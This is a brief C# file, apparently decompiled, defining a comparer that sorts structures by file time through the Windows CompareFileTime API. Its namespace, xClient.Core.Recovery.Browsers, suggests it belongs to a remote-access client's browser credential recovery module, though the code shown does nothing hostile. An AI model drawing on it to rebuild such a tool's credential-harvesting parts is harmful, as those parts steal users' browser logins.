using System.Collections;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

namespace xClient.Core.Recovery.Browsers;

public class SortFileTimeAscendingHelper : IComparer
{
	int IComparer.Compare(object a, object b)
	{
		GStruct3 gStruct = (GStruct3)a;
		GStruct3 gStruct2 = (GStruct3)b;
		return CompareFileTime(ref gStruct.filetime_0, ref gStruct2.filetime_0);
	}

	[DllImport("Kernel32.dll")]
	private static extern int CompareFileTime([In] ref FILETIME lpFileTime1, [In] ref FILETIME lpFileTime2);

	public static IComparer SortFileTimeAscending()
	{
		return new SortFileTimeAscendingHelper();
	}
}
